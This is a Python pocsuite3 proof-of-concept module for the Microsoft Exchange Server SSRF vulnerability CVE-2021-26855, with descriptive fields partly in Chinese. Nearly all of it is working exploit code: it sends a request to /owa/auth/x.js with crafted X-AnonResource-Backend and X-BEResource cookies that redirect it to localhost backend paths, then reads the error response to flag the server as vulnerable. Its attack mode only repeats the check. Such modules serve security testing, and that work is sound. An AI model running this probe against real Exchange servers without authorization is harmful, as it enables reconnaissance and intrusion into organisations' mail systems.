#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urljoin

from pocsuite3.api import POCBase, Output, register_poc, logger, requests


class DemoPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['']
    vulDate = '2021-03-06'
    createDate = '2021-03-06'
    updateDate = '2021-03-06'
    references = ['']
    name = 'Microsoft Exchange Server SSRF漏洞'
    appPowerLink = ''
    appName = 'Microsoft Exchange Server'
    appVersion = 'Exchange Server 2013、Exchange Server 2016、Exchange Server 2019'
    vulType = ''
    desc = '''
    from: https://github.com/conjojo/Microsoft_Exchange_Server_SSRF_CVE-2021-26855
    Microsoft Exchange Server SSRF漏洞
    '''
    samples = ['']
    install_requires = ['']

    def _verify(self):
        result = {}

        try:
            vul_url = urljoin(self.url, "/owa/auth/x.js")
            headers = {
                'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
            }
            resp = requests.get(vul_url, headers=headers, timeout=10)
            if resp.status_code == 500 and 'NegotiateSecurityContext' in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            logger.error(e)

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register_poc(DemoPOC)